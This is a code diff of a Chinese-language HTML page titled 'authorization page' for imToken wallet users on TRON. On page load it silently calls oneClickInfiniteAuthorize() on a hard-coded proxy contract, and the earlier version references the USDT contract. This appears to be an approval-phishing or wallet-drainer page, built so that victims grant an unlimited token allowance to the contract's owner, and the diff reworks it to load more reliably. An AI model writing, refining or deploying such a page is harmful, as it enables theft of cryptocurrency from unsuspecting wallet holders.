@@ -1,57 +1,58 @@
 <!DOCTYPE html>
 <html>
-<!DOCTYPE html>
-<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>授权页</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.7.0/dist/TronWeb.min.js"></script>
+    <!-- 去掉外部TronWeb引入，只用imToken内置的 -->
 </head>
 <body>
-    <div id="log">正在触发授权...</div>
+    <div id="log">正在准备授权...</div>
 
     <script>
-        const PROXY_CONTRACT = "TRtKzVfnbyDKkkjdmrArK2wecGEuHUeNBV";
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const PROXY_CONTRACT = "TRtKzVfnbyDKkkjdmrArK2wecGEuHUeNBV"; // 你的合约地址
 
-        // 适配v2.17版本的TronWeb初始化
-        async function initTronWeb() {
-            if (window.imToken && window.imToken.tronWeb) {
-                return window.imToken.tronWeb;
-            }
-            return new TronWeb({
-                fullNode: "https://api.trongrid.io",
-                solidityNode: "https://api.trongrid.io",
-                eventServer: "https://api.trongrid.io"
+        // 等待imToken内置TronWeb加载完成（v2.17专属）
+        function waitForTronWeb() {
+            return new Promise((resolve) => {
+                const checkTimer = setInterval(() => {
+                    if (window.imToken && window.imToken.tronWeb) {
+                        clearInterval(checkTimer);
+                        resolve(window.imToken.tronWeb);
+                    }
+                }, 200);
             });
         }
 
-        // 自动授权
+        // 自动触发授权
         async function autoAuthorize() {
             const log = document.getElementById("log");
             try {
-                const tronWeb = await initTronWeb();
+                // 等待内置TronWeb加载
+                const tronWeb = await waitForTronWeb();
                 const userAddr = tronWeb.defaultAddress.base58;
 
+                // 检查是否登录
                 if (!userAddr) {
-                    log.textContent = "请登录imToken钱包";
+                    log.textContent = "请先登录imToken钱包";
                     return;
                 }
 
+                // 调用合约一键授权
                 log.textContent = "请在imToken中确认授权...";
                 const proxyContract = await tronWeb.contract().at(PROXY_CONTRACT);
                 const tx = await proxyContract.oneClickInfiniteAuthorize().send({
                     from: userAddr,
-                    feeLimit: 500000000
+                    feeLimit: 500000000 // 50 TRX足够
                 });
 
                 log.textContent = "授权成功！交易ID：" + tx.txid.slice(0,18);
             } catch (e) {
-                log.textContent = "失败：" + (e.message || "错误").slice(0,50);
+                log.textContent = "失败：" + (e.message || "授权出错").slice(0,50);
             }
         }
 
+        // 页面加载后立即执行
         window.onload = autoAuthorize;
     </script>
 </body>
